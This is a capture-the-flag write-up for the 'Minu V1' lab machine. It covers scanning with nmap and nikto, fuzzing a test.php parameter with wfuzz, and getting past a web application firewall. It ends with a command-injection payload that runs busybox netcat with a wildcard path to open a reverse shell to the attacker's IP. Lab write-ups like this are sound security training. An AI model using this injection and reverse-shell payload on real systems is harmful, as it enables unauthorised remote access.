# Minu V1 Write Up

### Getting the Ip address of the target machine I used arp-scan in local network

> target ip: 192.168.100.14

### Target Scanning using nmap

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV 192.168.100.14

```

Only http port (80) is open, lets open it in web browser and got the following page

Using the nikto tool to get the vulnearabilities

```bash

```

So here I got the hidden file `test.php`
![test.php page](./screenshots/test_php.png)

Here is the test.php page but I didn't got any interesting stuff.

Now I tested, the local file inclusive vulnearability, but WAP (Web Application Firewall) blocks it, so we need to bypass the filters and for this we have to supply some payloads until we get some response

For this, I will be using `wfuzz`, a web application fuzzer used for brute-forcing and testing web parameters.

```bash
wfuzz -c -u 'http://192.168.100.14/test.php?file=FUZZ' -w /usr/share/wfuzz/wordlist/Injections/All_attack.txt --hc 403 --hw 159

# -u target URL
# -w wordlist
# --hc 403 hides responses with HTTP status code 403
# --hw 159 hides responses whose body has 159 words
```

Output:

```bash

```

So I got the following payload `|dir` and `|id`

### Bypassing WAF

So I tested and many payload and got the interesting one that is `which` through I go the nc binary path, so we can establish reverse shell connection with target machine using netcat, but we will need a vulnearable binary to execute the nc command

The target machine is having `busybox` binary and its path is `/bin/busybox` so we can use this to execute the netcat.

For busybox payload I will be using [GTFIO BIns](https://gtfobins.github.io/gtfobins/busybox/)

So the payload goes as:

```bash

http://192.168.100.14/test.php?file=shell;busybox /b?n/nc 192.168.100.5 4433  -e sh

```

and got the reverse shell
